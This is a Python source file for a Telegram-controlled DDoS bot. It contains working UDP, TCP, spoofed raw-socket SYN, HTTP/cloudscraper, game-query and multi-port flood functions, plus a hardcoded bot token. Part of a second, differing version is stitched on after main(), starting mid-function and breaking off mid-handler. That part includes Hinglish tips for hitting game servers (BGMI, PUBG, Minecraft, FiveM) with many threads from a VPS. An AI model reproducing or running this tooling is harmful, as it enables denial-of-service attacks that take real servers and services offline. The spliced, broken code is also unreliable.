# ddos_stable_fixed.py
import socket
import threading
import time
import random
import re
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters

# Try optional HTTP libraries, but don't crash if missing
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

# HTTP/2 is optional – disable if h2 not installed
HTTP2_AVAILABLE = False
try:
    import h2
    HTTP2_AVAILABLE = True
except ImportError:
    pass

# For cloudscraper (optional)
try:
    import cloudscraper
    CLOUD_AVAILABLE = True
except ImportError:
    CLOUD_AVAILABLE = False

# ============ CONFIG ============
BOT_TOKEN = "8278228198:AAG7C97c7R50_gsykoqBMwesCuoRZTciCLA"
ADMIN_ID = 8210011971
BLOCKED_PORTS = {22, 25, 443, 3389, 8700, 9031, 17500, 20000, 20001, 20002}

# Power levels (3x max, stable)
POWER_LEVEL = 3
THREADS_PER_LEVEL = {1: 100, 2: 200, 3: 300}   # L4 threads (UDP/Mixed)
HTTP_THREADS = 100   # L7 threads (HTTP)
SOCKETS_PER_THREAD = 3
DELAY_SEC = 0.0005

# Attack state
attack_running = False
attack_threads = []
current_attack = {
    'ip': None, 'port': None, 'method': None, 'duration': 0,
    'start_time': 0, 'packets': 0, 'message_id': None
}
attack_lock = threading.Lock()

# ============ L4 ATTACKS (UDP / Mixed) ============
def udp_flood(ip, port, duration):
    global attack_running, current_attack
    timeout = time.time() + duration
    port = int(port)
    # Create multiple sockets
    socks = []
    for _ in range(SOCKETS_PER_THREAD):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            socks.append(s)
        except:
            pass
    payload = random._urandom(512)
    while time.time() < timeout and attack_running:
        for sock in socks:
            try:
                sock.sendto(payload, (ip, port))
                with attack_lock:
                    current_attack['packets'] += 1
            except:
                pass
        time.sleep(DELAY_SEC)
    for sock in socks:
        sock.close()

def mixed_attack(ip, port, duration):
    global attack_running, current_attack
    timeout = time.time() + duration
    udp_socks = []
    for _ in range(SOCKETS_PER_THREAD):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udp_socks.append(s)
        except:
            pass
    payload = random._urandom(512)
    while time.time() < timeout and attack_running:
        # UDP send
        for sock in udp_socks:
            try:
                sock.sendto(payload, (ip, int(port)))
                with attack_lock:
                    current_attack['packets'] += 1
            except:
                pass
        # TCP SYN (lightweight)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect_ex((ip, int(port)))
            s.close()
            with attack_lock:
                current_attack['packets'] += 1
        except:
            pass
        time.sleep(DELAY_SEC)
    for sock in udp_socks:
        sock.close()

# ============ HTTP-EMULATE (without heavy deps) ============
def http_emulate_flood(target_url, duration):
    global attack_running, current_attack
    timeout = time.time() + duration
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
    }
    
    # Choose session type
    if CLOUD_AVAILABLE:
        session = cloudscraper.create_scracer()
    else:
        session = requests.Session() if REQUESTS_AVAILABLE else None
    
    if session is None:
        return  # No HTTP support
    
    while time.time() < timeout and attack_running:
        try:
            url = f"{target_url}?rand={random.randint(1,999999)}"
            resp = session.get(url, headers=headers, timeout=5, verify=False)
            with attack_lock:
                current_attack['packets'] += 1
            # Adaptive sleep
            if resp.status_code in [429, 503]:
                time.sleep(0.5)
            else:
                time.sleep(random.uniform(0.01, 0.05))
        except Exception:
            time.sleep(0.2)
    session.close()

# ============ HTTP-CONNECT (HTTP/1.1 only, no HTTP/2 crash) ============
def http_connect_flood(target_url, duration):
    global attack_running, current_attack
    timeout = time.time() + duration
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
    }
    
    if not REQUESTS_AVAILABLE:
        return
    
    session = requests.Session()
    # Disable HTTP/2 to avoid h2 dependency
    # We'll just use HTTP/1.1 with connection pooling
    
    reset_interval = 0.01  # Rapid reset simulation
    
    while time.time() < timeout and attack_running:
        try:
            # Open connection and close immediately (simulate reset)
            resp = session.get(target_url, headers=headers, timeout=5, stream=True)
            resp.close()  # Immediate close = reset
            with attack_lock:
                current_attack['packets'] += 1
            time.sleep(reset_interval)
        except Exception:
            time.sleep(0.05)
    session.close()

# ============ ATTACK LAUNCHER ============
def launch_attack(ip, port, duration, method, send_func):
    global attack_running, attack_threads, current_attack
    
    attack_running = True
    with attack_lock:
        current_attack = {
            'ip': ip, 'port': port, 'method': method, 'duration': duration,
            'start_time': time.time(), 'packets': 0, 'message_id': None
        }
    
    keyboard = [
        [InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop_attack")],
        [InlineKeyboardButton("ℹ️ INFO", callback_data="info"), InlineKeyboardButton("🔄 REFRESH", callback_data="refresh")],
        [InlineKeyboardButton("❌ CANCEL", callback_data="cancel")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Choose attack method and thread count
    if method == 'udp':
        num_threads = THREADS_PER_LEVEL[POWER_LEVEL]
        target_func = udp_flood
        target_args = (ip, port, duration)
        attack_type = "UDP (L4)"
    elif method == 'mixed':
        num_threads = THREADS_PER_LEVEL[POWER_LEVEL]
        target_func = mixed_attack
        target_args = (ip, port, duration)
        attack_type = "Mixed (L4)"
    elif method == 'http_emulate':
        num_threads = HTTP_THREADS
        target_url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}:{port}"
        target_func = http_emulate_flood
        target_args = (target_url, duration)
        attack_type = "HTTP-Emulate (L7)"
    elif method == 'http_connect':
        num_threads = HTTP_THREADS
        target_url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}:{port}"
        target_func = http_connect_flood
        target_args = (target_url, duration)
        attack_type = "HTTP-Connect (L7)"
    else:
        return
    
    # Send initial message
    start_msg = send_func(
        f"🔥 *ATTACK STARTING* 🔥\n\n"
        f"🎯 Target `{ip}:{port}`\n"
        f"⚙️ Method: `{method.upper()}` ({attack_type})\n"
        f"🧵 Threads: `{num_threads}`\n"
        f"⏱️ Duration: `{duration}s`\n\n"
        f"_Launching threads..._",
        reply_markup, edit=False
    )
    if start_msg:
        current_attack['message_id'] = start_msg.message_id
    
    # Launch threads
    attack_threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=target_func, args=target_args, daemon=True)
        t.start()
        attack_threads.append(t)
    
    # Monitor loop
    start_time = time.time()
    last_update = 0
    while attack_running and (time.time() - start_time) < duration:
        time.sleep(1)
        elapsed = int(time.time() - start_time)
        remaining = duration - elapsed
        if time.time() - last_update >= 2:
            last_update = time.time()
            with attack_lock:
                pkt = current_attack['packets']
            progress = int((elapsed / duration) * 20)
            bar = "█" * progress + "░" * (20 - progress)
            speed = int(pkt / elapsed) if elapsed > 0 else 0
            text = (
                f"🔥 *ATTACK IN PROGRESS* 🔥\n\n"
                f"🎯 `{ip}:{port}`\n"
                f"⚙️ Method: `{method.upper()}`\n"
                f"📦 Packets/Req: `{pkt:,}`\n"
                f"⏱️ Time: `{elapsed}/{duration}s`\n"
                f"📊 `[{bar}]`\n"
                f"💥 Rate: `{speed:,}` pps\n"
                f"🧵 Threads: `{num_threads}`\n\n"
                f"🔘 *Buttons below*"
            )
            try:
                send_func(text, reply_markup, edit=True, msg_id=current_attack['message_id'])
            except:
                pass
    
    # Attack finished
    attack_running = False
    for t in attack_threads:
        t.join(timeout=0.5)
    
    with attack_lock:
        pkt = current_attack['packets']
    speed = int(pkt / duration) if duration else 0
    text = (
        f"✅ *ATTACK COMPLETED* ✅\n\n"
        f"🎯 `{ip}:{port}`\n"
        f"⚙️ Method: `{method.upper()}`\n"
        f"📦 Total: `{pkt:,}`\n"
        f"⏱️ Duration: `{duration}s`\n"
        f"💥 Avg Rate: `{speed:,}` pps\n"
    )
    try:
        send_func(text, None, edit=True, msg_id=current_attack['message_id'])
    except:
        pass

# ============ TELEGRAM BOT HANDLERS ============
user_data = {}

def send_helper(update, text, reply_markup=None, edit=False, msg_id=None):
    if edit and msg_id:
        # Just send new message (old API limitation)
        return update.effective_message.reply_text(text, parse_mode='Markdown', reply_markup=reply_markup)
    else:
        return update.effective_message.reply_text(text, parse_mode='Markdown', reply_markup=reply_markup)

def start(update, context):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        update.message.reply_text("❌ Unauthorized", parse_mode='Markdown')
        return
    user_data[user_id] = {'step': 'ip'}
    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
    update.message.reply_text(
        "⚡ *STABLE DDoS BOT* ⚡\n\n"
        "Send target *IP address*:\nExample: `192.168.1.1`\n\n"
        f"🔥 Power: `{POWER_LEVEL}x` (L4 threads: {THREADS_PER_LEVEL[POWER_LEVEL]})\n"
        f"🌐 L7 threads: {HTTP_THREADS}\n"
        f"✅ HTTP/2 disabled (stable)\n"
        f"⚠️ *Use on authorized targets only*",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

def power_command(update, context):
    global POWER_LEVEL
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        return
    if not context.args:
        update.message.reply_text(f"Current power: `{POWER_LEVEL}x` (1,2,3)\nMax L4 threads: {THREADS_PER_LEVEL[POWER_LEVEL]}")
        return
    try:
        level = int(context.args[0])
        if level in [1,2,3]:
            POWER_LEVEL = level
            update.message.reply_text(f"✅ Power set to {level}x → L4 threads: {THREADS_PER_LEVEL[level]}")
        else:
            update.message.reply_text("❌ Use 1, 2, or 3")
    except:
        update.message.reply_text("❌ Invalid number")

def handle_message(update, context):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        return
    text = update.message.text.strip()
    step = user_data.get(user_id, {}).get('step')
    
    if step == 'ip':
        user_data[user_id]['ip'] = text
        user_data[user_id]['step'] = 'port'
        update.message.reply_text(
            f"🔌 Send *port* (1-65535):\nExample: `80`\n🚫 Blocked: {', '.join(map(str, sorted(BLOCKED_PORTS)))}",
            parse_mode='Markdown'
        )
    elif step == 'port':
        try:
            port = int(text)
            if port < 1 or port > 65535 or port in BLOCKED_PORTS:
                update.message.reply_text("❌ Invalid or blocked port")
                return
            user_data[user_id]['port'] = port
            user_data[user_id]['step'] = 'method'
            keyboard = [
                [InlineKeyboardButton("🔥 UDP (L4)", callback_data="udp")],
                [InlineKeyboardButton("💣 MIXED (L4)", callback_data="mixed")],
                [InlineKeyboardButton("🦊 HTTP-EMULATE (L7)", callback_data="http_emulate")],
                [InlineKeyboardButton("⚡ HTTP-CONNECT (L7)", callback_data="http_connect")],
                [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
            ]
            update.message.reply_text("⚡ Select attack method:", reply_markup=InlineKeyboardMarkup(keyboard))
        except:
            update.message.reply_text("❌ Send number only.")
    elif step == 'duration':
        try:
            duration = int(text)
            if duration < 5 or duration > 300:
                update.message.reply_text("❌ Duration 5-300 seconds")
                return
            ip = user_data[user_id]['ip']
            port = user_data[user_id]['port']
            method = user_data[user_id].get('method', 'mixed')
            user_data[user_id]['final'] = (ip, port, duration, method)
            user_data[user_id]['step'] = 'confirm'
            keyboard = [
                [InlineKeyboardButton("✅ START ATTACK", callback_data="confirm_start")],
                [InlineKeyboardButton("❌ CANCEL", callback_data="cancel")]
            ]
            update.message.reply_text(
                f"🔥 *Confirm {method.upper()} Attack*\n\n"
                f"🎯 `{ip}:{port}`\n"
                f"⏱️ `{duration}s` | Power `{POWER_LEVEL}x`\n\n"
                f"⚠️ Start?",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        except:
            update.message.reply_text("❌ Send number.")

def button_callback(update, context):
    query = update.callback_query
    query.answer()
    user_id = query.from_user.id
    if user_id != ADMIN_ID:
        query.edit_message_text("❌ Unauthorized")
        return
    data = query.data
    global attack_running, current_attack
    
    if data == "cancel":
        if user_id in user_data:
            del user_data[user_id]
        query.edit_message_text("❌ Cancelled")
        return
    if data in ['udp', 'mixed', 'http_emulate', 'http_connect']:
        user_data[user_id]['method'] = data
        user_data[user_id]['step'] = 'duration'
        query.edit_message_text(f"✅ Method: `{data.upper()}`\n⏱️ Send duration (5-300s):", parse_mode='Markdown')
        return
    if data == "confirm_start":
        if user_id not in user_data or 'final' not in user_data[user_id]:
            query.edit_message_text("❌ Session expired. Use /start")
            return
        ip, port, duration, method = user_data[user_id]['final']
        del user_data[user_id]
        def send_func(text, markup, edit=False, msg_id=None):
            if edit and msg_id:
                query.message.reply_text(text, parse_mode='Markdown', reply_markup=markup)
                return None
            else:
                return query.message.reply_text(text, parse_mode='Markdown', reply_markup=markup)
        threading.Thread(target=launch_attack, args=(ip, port, duration, method, send_func), daemon=True).start()
        return
    if data == "stop_attack":
        if attack_running:
            attack_running = False
            query.edit_message_text("🛑 *Attack stopped*", parse_mode='Markdown')
        else:
            query.answer("No active attack")
        return
    if data == "info":
        if attack_running:
            with attack_lock:
                pkt = current_attack['packets']
                elapsed = int(time.time() - current_attack['start_time'])
                remaining = current_attack['duration'] - elapsed
                speed = int(pkt/elapsed) if elapsed>0 else 0
                info_text = (
                    f"ℹ️ *Attack Info*\n\n"
                    f"🎯 `{current_attack['ip']}:{current_attack['port']}`\n"
                    f"⚙️ Method: `{current_attack['method'].upper()}`\n"
                    f"📦 Packets/Req: `{pkt:,}`\n"
                    f"⏱️ Elapsed/Total: `{elapsed}/{current_attack['duration']}s`\n"
                    f"💥 Rate: `{speed:,}` pps\n"
                    f"📡 Status: `ACTIVE`"
                )
        else:
            info_text = "ℹ️ *No attack running*"
        query.edit_message_text(info_text, parse_mode='Markdown')
    if data == "refresh":
        if attack_running:
            with attack_lock:
                pkt = current_attack['packets']
                elapsed = int(time.time() - current_attack['start_time'])
                remaining = current_attack['duration'] - elapsed
                progress = int((elapsed / current_attack['duration']) * 20)
                bar = "█" * progress + "░" * (20 - progress)
                speed = int(pkt/elapsed) if elapsed>0 else 0
                text = (
                    f"🔥 *ATTACK IN PROGRESS* 🔥\n\n"
                    f"🎯 `{current_attack['ip']}:{current_attack['port']}`\n"
                    f"⚙️ Method: `{current_attack['method'].upper()}`\n"
                    f"📦 Packets: `{pkt:,}`\n"
                    f"⏱️ Time: `{elapsed}/{current_attack['duration']}s`\n"
                    f"📊 `[{bar}]`\n"
                    f"💥 Rate: `{speed:,}` pps\n\n"
                    f"🔘 *Buttons below*"
                )
                keyboard = [
                    [InlineKeyboardButton("🛑 STOP", callback_data="stop_attack")],
                    [InlineKeyboardButton("ℹ️ INFO", callback_data="info"), InlineKeyboardButton("🔄 REFRESH", callback_data="refresh")],
                    [InlineKeyboardButton("❌ CANCEL", callback_data="cancel")]
                ]
                query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            query.edit_message_text("✅ No active attack", parse_mode='Markdown')

def stop_command(update, context):
    global attack_running
    if update.effective_user.id != ADMIN_ID:
        update.message.reply_text("❌ Unauthorized")
        return
    attack_running = False
    update.message.reply_text("🛑 Attack stopped by command", parse_mode='Markdown')

def main():
    print("⚡ STABLE DDoS Bot (No HTTP/2 required)")
    print(f"👑 Admin: {ADMIN_ID}")
    print(f"💪 L4 max threads: {THREADS_PER_LEVEL[POWER_LEVEL]}")
    print(f"🌐 L7 threads: {HTTP_THREADS}")
    print(f"📦 requests: {'available' if REQUESTS_AVAILABLE else 'NOT installed'}")
    print(f"🕸️ cloudscraper: {'yes' if CLOUD_AVAILABLE else 'no'}")
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("stop", stop_command))
    dp.add_handler(CommandHandler("power", power_command))
    dp.add_handler(CallbackQueryHandler(button_callback))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
    print("✅ Bot is LIVE! Send /start")
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
    while time.time() < timeout and attack_running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            s.connect_ex((ip, port))
            # Send garbage data
            s.send(random._urandom(2048))
            with attack_lock:
                attack_stats['packets'] += 1
                attack_stats['bytes'] += 2048
            s.close()
        except:
            pass


def syn_flood_raw(ip, port, duration):
    """Raw socket SYN flood - requires root/admin"""
    global attack_running, attack_stats
    timeout = time.time() + int(duration)
    port = int(port)

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print("⚠️ Raw socket need ROOT/SUDO access!")
        # Fallback to TCP flood
        tcp_flood(ip, port, duration)
        return

    def checksum(data):
        if len(data) % 2:
            data += b'\x00'
        s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff

    dest_ip = socket.inet_aton(ip)

    while time.time() < timeout and attack_running:
        try:
            src_ip = socket.inet_aton(f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}")
            src_port = random.randint(1024, 65535)

            # IP Header
            ip_header = struct.pack('!BBHHHBBH4s4s',
                0x45, 0, 40,
                random.randint(1, 65535), 0,
                64, socket.IPPROTO_TCP, 0,
                src_ip, dest_ip
            )

            # TCP Header with SYN flag
            seq = random.randint(0, 0xFFFFFFFF)
            tcp_header = struct.pack('!HHLLBBHHH',
                src_port, port,
                seq, 0,
                0x50, 0x02,  # SYN flag
                65535, 0, 0
            )

            # Pseudo header for checksum
            pseudo = struct.pack('!4s4sBBH', src_ip, dest_ip, 0, socket.IPPROTO_TCP, len(tcp_header))
            tcp_check = checksum(pseudo + tcp_header)
            tcp_header = struct.pack('!HHLLBBHHH',
                src_port, port,
                seq, 0,
                0x50, 0x02,
                65535, tcp_check, 0
            )

            packet = ip_header + tcp_header
            s.sendto(packet, (ip, port))

            with attack_lock:
                attack_stats['packets'] += 1
                attack_stats['bytes'] += len(packet)
        except:
            pass

    s.close()


def game_query_flood(ip, port, duration):
    """Game protocol specific packets - Source/Valve/Minecraft"""
    global attack_running, attack_stats
    timeout = time.time() + int(duration)
    port = int(port)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Game-specific query packets
    game_payloads = [
        # Source Engine Query
        b'\xff\xff\xff\xff\x54Source Engine Query\x00',
        # Valve Server query
        b'\xff\xff\xff\xff\x55\xff\xff\xff\xff',
        # Minecraft handshake
        b'\xfe\x01\xfa\x00\x06\x00\x6d\x00\x69\x00\x6e\x00\x65',
        # Generic game ping
        b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
        # SAMP query
        b'SAMP' + b'\x00' * 20,
        # MTA query
        b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
        # Large random game packet
        random._urandom(4096),
        random._urandom(8192),
    ]

    while time.time() < timeout and attack_running:
        for payload in game_payloads:
            try:
                sock.sendto(payload, (ip, port))
                with attack_lock:
                    attack_stats['packets'] += 1
                    attack_stats['bytes'] += len(payload)
            except:
                pass

    sock.close()


def multi_port_flood(ip, port, duration):
    """Attack on multiple common game ports simultaneously"""
    global attack_running, attack_stats
    timeout = time.time() + int(duration)

    game_ports = [int(port), 7777, 7778, 7789, 7889, 8080, 8888, 9999,
                  17500, 17000, 17010, 25565, 27015, 27016, 30120, 30110]

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(65000)

    while time.time() < timeout and attack_running:
        for p in game_ports:
            try:
                sock.sendto(payload, (ip, p))
                with attack_lock:
                    attack_stats['packets'] += 1
                    attack_stats['bytes'] += len(payload)
            except:
                pass

    sock.close()


# ============================================
#        MULTI-VECTOR ATTACK LAUNCHER
# ============================================

def launch_attack(ip, port, duration, threads, method, update_func=None):
    global attack_running, attack_stats, attack_threads_list
    attack_running = True
    attack_stats = {'packets': 0, 'bytes': 0}
    attack_threads_list = []

    methods = {
        'udp': udp_flood,
        'tcp': tcp_flood,
        'syn': syn_flood_raw,
        'game': game_query_flood,
        'multiport': multi_port_flood,
        'mixed': None  # Special - all methods combined
    }

    thread_count = int(threads)

    if method == 'mixed':
        # Divide threads across all methods
        all_methods = [udp_flood, tcp_flood, syn_flood_raw, game_query_flood, multi_port_flood]
        per_method = max(1, thread_count // len(all_methods))

        for attack_func in all_methods:
            for _ in range(per_method):
                t = threading.Thread(target=attack_func, args=(ip, port, duration), daemon=True)
                t.start()
                attack_threads_list.append(t)
    else:
        attack_func = methods.get(method, udp_flood)
        for _ in range(thread_count):
            t = threading.Thread(target=attack_func, args=(ip, port, duration), daemon=True)
            t.start()
            attack_threads_list.append(t)

    # Stats monitor thread
    if update_func:
        monitor = threading.Thread(target=stats_monitor, args=(ip, port, duration, update_func), daemon=True)
        monitor.start()


def stats_monitor(ip, port, duration, update_func):
    global attack_running, attack_stats
    start_time = time.time()
    dur = int(duration)

    while attack_running and (time.time() - start_time) < dur:
        time.sleep(5)
        elapsed = int(time.time() - start_time)
        remaining = dur - elapsed
        pkts = attack_stats['packets']
        mb = attack_stats['bytes'] / (1024 * 1024)
        pps = pkts / max(elapsed, 1)

        try:
            update_func(
                f"⚡ *ATTACK LIVE*\n\n"
                f"🎯 Target: `{ip}:{port}`\n"
                f"📦 Packets: `{pkts:,}`\n"
                f"📊 Data Sent: `{mb:,.1f} MB`\n"
                f"🚀 Speed: `{pps:,.0f} pkt/s`\n"
                f"⏱ Remaining: `{remaining}s`\n"
                f"━━━━━━━━━━━━━━━"
            )
        except:
            pass

    attack_running = False
    pkts = attack_stats['packets']
    mb = attack_stats['bytes'] / (1024 * 1024)

    try:
        update_func(
            f"✅ *ATTACK COMPLETE*\n\n"
            f"🎯 Target: `{ip}:{port}`\n"
            f"📦 Total Packets: `{pkts:,}`\n"
            f"📊 Total Data: `{mb:,.1f} MB`\n"
            f"⏱ Duration: `{duration}s`\n"
            f"━━━━━━━━━━━━━━━"
        )
    except:
        pass


# ============================================
#           TELEGRAM BOT HANDLERS
# ============================================

def start(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id != ADMIN_ID:
        update.message.reply_text("❌ Access Denied.")
        return

    keyboard = [
        [InlineKeyboardButton("🚀 Attack", callback_data="menu_attack")],
        [InlineKeyboardButton("🛑 Stop Attack", callback_data="menu_stop")],
        [InlineKeyboardButton("📖 Help", callback_data="menu_help")],
    ]
    update.message.reply_text(
        "⚡ *DDoS Attack Bot* ⚡\n\nSelect option:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )


def show_help(query):
    query.edit_message_text(
        "📖 *Attack Methods:*\n\n"
        "🔵 *UDP Flood* - Heavy data flood, best for game servers\n"
        "🔴 *TCP Flood* - Connection exhaustion\n"
        "🟡 *SYN Flood* - Raw packet SYN (needs root)\n"
        "🟢 *Game Query* - Game protocol specific\n"
        "🟣 *Multi-Port* - Hit multiple ports at once\n"
        "⚫ *MIXED (Best)* - All methods combined!\n\n"
        "⚠️ *Tips:*\n"
        "• `Mixed` method sabse effective hai\n"
        "• 500+ threads use karo\n"
        "• Root/sudo se run karo for SYN flood\n"
        "• VPS se run karo (high bandwidth)\n",
        parse_mode="Markdown"
    )


def ask_ip(query, context):
    context.user_data['step'] = 'waiting_ip'
    query.edit_message_text("🎯 *Target IP bhejo:*\n\nExample: `1.2.3.4`", parse_mode="Markdown")


def show_port_buttons(chat_func, ip):
    keyboard = [
        [InlineKeyboardButton("17500 (FF/BGMI)", callback_data="port_17500"),
         InlineKeyboardButton("7889 (PUBG)", callback_data="port_7889")],
        [InlineKeyboardButton("25565 (MC)", callback_data="port_25565"),
         InlineKeyboardButton("30120 (FiveM)", callback_data="port_30120")],
        [InlineKeyboardButton("80 (HTTP)", callback_data="port_80"),
         InlineKeyboardButton("443 (HTTPS)", callback_data="port_443")],
        [InlineKeyboardButton("✏️ Custom Port", callback_data="port_custom")],
    ]
    chat_func(
        f"✅ IP: `{ip}`\n\n🔌 *Port select karo:*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )


def show_method_buttons(query, context):
    keyboard = [
        [InlineKeyboardButton("🔵 UDP Flood", callback_data="method_udp"),
         InlineKeyboardButton("🔴 TCP Flood", callback_data="method_tcp")],
        [InlineKeyboardButton("🟡 SYN Flood", callback_data="method_syn"),
         InlineKeyboardButton("🟢 Game Query", callback_data="method_game")],
        [InlineKeyboardButton("🟣 Multi-Port", callback_data="method_multiport")],
        [InlineKeyboardButton("⚫ MIXED (BEST)", callback_data="method_mixed")],
    ]
    port = context.user_data.get('port', '?')
    query.edit_message_text(
        f"✅ Port: `{port}`\n\n💣 *Attack Method select karo:*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )


def show_thread_buttons(query, context):
    keyboard = [
        [InlineKeyboardButton("100", callback_data="thread_100"),
         InlineKeyboardButton("200", callback_data="thread_200"),
         InlineKeyboardButton("500", callback_data="thread_500")],
        [InlineKeyboardButton("1000", callback_data="thread_1000"),
         InlineKeyboardButton("2000", callback_data="thread_2000")],
    ]
    method = context.user_data.get('method', '?')
    query.edit_message_text(
        f"✅ Method: `{method}`\n\n🧵 *Threads select karo:*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )


def show_time_buttons(query, context):
    keyboard = [
        [InlineKeyboardButton("30s", callback_data="time_30"),
         InlineKeyboardButton("60s", callback_data="time_60"),
         InlineKeyboardButton("120s", callback_data="time_120")],
        [InlineKeyboardButton("180s", callback_data="time_180"),
         InlineKeyboardButton("300s", callback_data="time_300"),
         InlineKeyboardButton("600s", callback_data="time_600")],
    ]
    threads = context.user_data.get('threads', '?')
    query.edit_message_text(
        f"✅ Threads: `{threads}`\n\n⏱ *Duration select karo:*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )


def show_confirm(query, context):
    ip = context.user_data.get('ip', '?')
    port = context.user_data.get('port', '?')
    method = context.user_data.get('method', '?')
    threads = context.user_data.get('threads', '?')
    duration = context.user_data.get('duration', '?')

    keyboard = [
        [InlineKeyboardButton("✅ LAUNCH ATTACK", callback_data="confirm_yes")],
        [InlineKeyboardButton("❌ Cancel", callback_data="confirm_no")],
    ]
    query.edit_message_text(
        f"⚡ *ATTACK SUMMARY*\n"
        f"━━━━━━━━━━━━━━━\n"
        f"🎯 IP: `{ip}`\n"
        f"🔌 Port: `{port}`\n"
        f"💣 Method: `{method}`\n"
        f"🧵 Threads: `{threads}`\n"
        f"⏱ Duration: `{duration}s`\n"
        f"━━━━━━━━━━━━━━━\n\n"
        f"*Confirm karo:*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )


def execute_attack(query, context):
    global attack_running

    if attack_running:
        query.edit_message_text("⚠️ Ek attack already chal raha hai! Pehle stop karo.")
        return

    ip = context.user_data.get('ip')
    port = context.user_data.get('port')
    method = context.user_data.get('method', 'mixed')
    threads = context.user_data.get('threads', '200')
    duration = context.user_data.get('duration', '60')

    msg = query.edit_message_text(
        f"🚀 *ATTACK LAUNCHING...*\n\n"
        f"🎯 `{ip}:{port}`\n"
        f"💣 Method: `{method}`\n"
        f"🧵 Threads: `{threads}`\n"
        f"⏱ Duration: `{duration}s`\n\n"
        f"⏳ Starting...",
        parse_mode="Markdown"
    )

    def update_msg(text):
        try:
            msg.edit_text(text, parse_mode="Markdown")
        except:
            pass

    # Launch in background
    t = threading.Thread(
        target=launch_attack,
        args=(ip, port, duration, threads, method, update_msg),
        daemon=True
    )
    t.start()


def stop_attack(query):
    global attack_running
    attack_running = False
    query.edit_message_text("🛑 *Attack Stopped!*", parse_mode="Markdown")


# ============================================
#         MAIN CALLBACK HANDLER
# ============================================

def button_callback(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id

    if user_id != ADMIN_ID:
        query.answer("❌ Access Denied!", show_alert=True)
        return

    query.answer()
    data = query.data

    # Menu
    if data == "menu_attack":
        ask_ip(query, context)
    elif data == "menu_stop":
        stop_attack(query)
    elif data == "menu_help":
        show_help(query)

    # Port
    elif data.startswith("port_"):
        if data == "port_custom":
            context.user_data['step'] = 'waiting_port'
            query.edit_message_text("✏️ *Custom port bhejo:*", parse_mode="Markdown")
        else:
            context.user_data['port'] = data.split("_", 1)[1]
            show_method_buttons(query, context)

    # Method
    elif data.startswith("method_"):
        context.user_data['method'] = data.split("_", 1)[1]
        show_thread_buttons(query, context)

    # Threads
    elif data.startswith("thread_"):
        context.user_data['threads'] = data.split("_", 1)[1]
        show_time_buttons(query, context)

    # Time
    elif data.startswith("time_"):
        context.user_data['duration'] = data.split("_", 1)[1]
        show_confirm(query, context)

    # Confirm
    elif data == "confirm_yes":
        execute_attack(query, context)
    elif data == "confirm_no":
        query.edit_message_text("❌ Cancelled.")


# ============================================
#          TEXT MESSAGE HANDLER
# ============================================

def handle_text(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id != ADMIN_ID:
        return

    step = context.user_data.get('step')

    if step == 'waiting_ip':
        ip = update.message.text.strip()
        context.user_data['ip'] = ip
